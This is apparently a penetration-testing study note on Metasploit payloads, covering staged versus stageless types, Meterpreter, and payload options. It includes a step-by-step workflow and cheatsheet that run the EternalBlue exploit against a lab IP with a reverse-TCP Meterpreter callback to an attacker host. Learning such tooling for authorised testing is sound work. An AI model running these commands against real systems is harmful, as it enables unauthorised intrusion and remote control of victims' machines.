# Metasploit Payloads

## Overview

In Metasploit, a **payload** is the code that runs on the target **after** exploitation succeeds.

Think of the split like this:

- **exploit** = gets you through the door
- **payload** = gives you something useful once inside

Typical payload goals:

- return a shell
- establish a reverse connection
- create a bind listener
- launch Meterpreter
- execute a command
- load a library
- provide post-exploitation capability

---

# 1. What a Payload Does

A payload is usually delivered **together with** the exploit.

Workflow:

1. exploit abuses the vulnerability
2. target executes payload
3. payload returns access or performs an action

Common outcomes:

- command shell
- Meterpreter session
- PowerShell session
- bind listener
- reverse connection

---

# 2. Payload Types

Metasploit payloads are generally grouped into:

- **Singles**
- **Stagers**
- **Stages**

These matter because they affect:

- size
- stability
- delivery method
- detection surface
- exploit compatibility

---

# 3. Singles

A **Single** payload is self-contained.

It includes:

- the payload logic
- the shellcode
- the final action

Everything is sent and executed as one object.

---

## Characteristics

- more stable
- no second stage required
- easier to reason about
- larger size
- may not fit all exploit constraints

---

## Example

```text
windows/shell_reverse_tcp
windows/x64/shell_reverse_tcp
```

This is a **single / inline / stageless** payload.

---

## Good For

- simple reverse shells
- reliable execution
- low-complexity exploitation
- situations where stage download may fail

---

# 4. Stagers

A **stager** is a small payload whose only job is to:

- establish connection
- prepare memory
- fetch the larger payload stage

It is typically tiny and designed to be reliable.

---

## Characteristics

- smaller initial payload
- useful where exploit space is limited
- depends on follow-up communication
- often paired with Meterpreter

---

## Common Stagers

```text
reverse_tcp
reverse_http
reverse_https
bind_tcp
bind_named_pipe
```

---

# 5. Stages

A **stage** is the larger payload component that gets delivered after the stager runs.

Stages provide advanced functionality such as:

- Meterpreter
- VNC injection
- larger shell environments
- richer post-exploitation features

---

## Why Stages Exist

A large payload may not fit directly into the exploit delivery space.

So the process becomes:

1. send small stager
2. stager connects back
3. stage is downloaded
4. full session becomes available

---

# 6. Staged vs Stageless Naming

A quick way to identify payload type is the name.

## Stageless / Single

```text
windows/shell_reverse_tcp
windows/x64/meterpreter_reverse_tcp
```

No extra stage separator.

---

## Staged

```text
windows/shell/reverse_tcp
windows/x64/meterpreter/reverse_tcp
```

The `/` after the shell type usually indicates staged format.

---

## Quick Rule

| Pattern | Type |
|---------|------|
| `shell_reverse_tcp` | stageless / single |
| `shell/reverse_tcp` | staged |
| `meterpreter_reverse_tcp` | stageless / single |
| `meterpreter/reverse_tcp` | staged |

---

# 7. Why Staged Payloads Can Be Useful

Advantages:

- smaller first payload
- fits better into memory-constrained exploits
- can deliver rich features afterward

Disadvantages:

- requires extra network traffic
- can be less stable
- second-stage transfer can fail
- more obvious traffic pattern in some cases

---

# 8. Why Stageless Payloads Can Be Useful

Advantages:

- full payload delivered at once
- often more stable
- simpler execution flow
- no second-stage dependency

Disadvantages:

- larger initial size
- may not fit exploit constraints
- can be less flexible for some exploits

---

# 9. Meterpreter Payloads

**Meterpreter** is one of the most important Metasploit payload families.

It provides:

- in-memory session
- file upload/download
- process migration
- privilege escalation helpers
- screenshots
- keylogging
- credential access
- pivoting
- extension loading

---

## Why Meterpreter Is Popular

- richer than a basic shell
- memory-resident
- extensible
- works well with post modules

---

## Example Meterpreter Payloads

```text
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_https
windows/x64/meterpreter_reverse_tcp
windows/x64/meterpreter_reverse_https
```

---

# 10. Listing Payloads

To list available payloads:

```bash
show payloads
```

This can be a very large list.

---

## Example

```bash
show payloads
```

You may see:

```text
windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter_reverse_tcp
windows/x64/shell_reverse_tcp
windows/x64/vncinject/reverse_tcp
windows/x64/powershell_reverse_tcp
```

---

# 11. Searching for Payloads Efficiently

Because the payload list is huge, filtering is essential.

Use `grep` inside msfconsole.

---

## Find Meterpreter Payloads

```bash
grep meterpreter show payloads
```

---

## Count Results

```bash
grep -c meterpreter show payloads
```

---

## Narrow to Reverse TCP Meterpreter

```bash
grep meterpreter grep reverse_tcp show payloads
```

---

## Count Narrowed Results

```bash
grep -c meterpreter grep reverse_tcp show payloads
```

---

# 12. Selecting a Payload

After choosing an exploit module, set a payload with:

```bash
set payload <number>
```

or full path:

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

---

## Example

```bash
set payload 15
```

Output:

```text
payload => windows/x64/meterpreter/reverse_tcp
```

---

# 13. Payload Options

Once a payload is selected, new options appear.

Most common payload options:

| Option | Meaning |
|--------|---------|
| `LHOST` | your callback IP |
| `LPORT` | your callback port |
| `EXITFUNC` | how payload exits |

---

## Example

```bash
show options
```

You may now see:

```text
Payload options (windows/x64/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique
LHOST                      yes       The listen address
LPORT     4444             yes       The listen port
```

---

# 14. Configuring Exploit + Payload Together

Typical exploit settings:

| Parameter | Purpose |
|-----------|---------|
| `RHOSTS` | target IP |
| `RPORT` | target service port |

Typical payload settings:

| Parameter | Purpose |
|-----------|---------|
| `LHOST` | attacker IP |
| `LPORT` | attacker listening port |

---

## Example

```bash
set RHOSTS 10.10.10.40
set LHOST 10.10.14.15
```

---

## Check Your Interface IP

From inside msfconsole:

```bash
ifconfig
```

This is useful for quickly identifying your VPN / tun0 address.

---

# 15. Example Workflow

## Select Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

## View Payloads

```bash
show payloads
```

## Filter Payloads

```bash
grep meterpreter grep reverse_tcp show payloads
```

## Select Payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

## Configure

```bash
set RHOSTS 10.10.10.40
set LHOST 10.10.14.15
```

## Run

```bash
run
```

---

# 16. Understanding the Output

With a staged Meterpreter payload, you may see:

```text
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened ...
```

This indicates:

1. exploit succeeded
2. stage transfer occurred
3. Meterpreter session opened

---

# 17. Meterpreter vs OS Shell

After Meterpreter opens, you are **not** in CMD or Bash yet.

Example:

```text
meterpreter >
```

Commands such as:

```bash
whoami
```

may not work directly because this is a Meterpreter prompt, not a native OS shell.

Use Meterpreter-native commands such as:

```bash
getuid
sysinfo
ls
cd
```

To drop into a normal shell:

```bash
shell
```

---

# 18. Common Windows Payload Families

| Payload | Description |
|---------|-------------|
| `generic/custom` | generic listener / multi-use |
| `generic/shell_bind_tcp` | simple bind shell |
| `generic/shell_reverse_tcp` | simple reverse shell |
| `windows/x64/exec` | execute arbitrary command |
| `windows/x64/loadlibrary` | load arbitrary DLL |
| `windows/x64/messagebox` | spawn message box |
| `windows/x64/shell_reverse_tcp` | stageless reverse shell |
| `windows/x64/shell/reverse_tcp` | staged reverse shell |
| `windows/x64/meterpreter/...` | Meterpreter variants |
| `windows/x64/powershell/...` | PowerShell-based payloads |
| `windows/x64/vncinject/...` | VNC payload family |

---

# 19. Practical Payload Selection Guidance

Choose payload based on goal:

| Goal | Likely Choice |
|------|---------------|
| simple shell | `shell_reverse_tcp` |
| richer post-exploitation | `meterpreter/reverse_tcp` |
| more stable all-in-one | `meterpreter_reverse_tcp` |
| HTTP egress friendly | `reverse_http` / `reverse_https` |
| SMB / named pipe environment | `bind_named_pipe` / `reverse_named_pipe` |

---

# 20. Key Takeaways

- exploit gets execution; payload decides what you get back
- staged payloads use a stager + stage
- stageless payloads send everything at once
- Meterpreter is powerful but not the same as a native shell
- use `grep` to narrow payload lists quickly
- always verify `LHOST`, `LPORT`, `RHOSTS`, and architecture

---

# Cheatsheet

## List payloads

```bash
show payloads
```

## Filter payloads

```bash
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads
```

## Select payload

```bash
set payload windows/x64/meterpreter/reverse_tcp
set payload 15
```

## Configure

```bash
set RHOSTS 10.10.10.40
set LHOST 10.10.14.15
set LPORT 4444
```

## Check interface

```bash
ifconfig
```

## Run exploit

```bash
run
exploit
```

## Meterpreter basics

```bash
getuid
sysinfo
ls
cd Users
shell
```

---

# Related Notes

- Metasploit overview
- Metasploit modules
- Metasploit targets
- Meterpreter commands
- msfvenom
- multi/handler

---

# Tags

#metasploit #payloads #meterpreter #reverse-shell #staged #stageless #oscp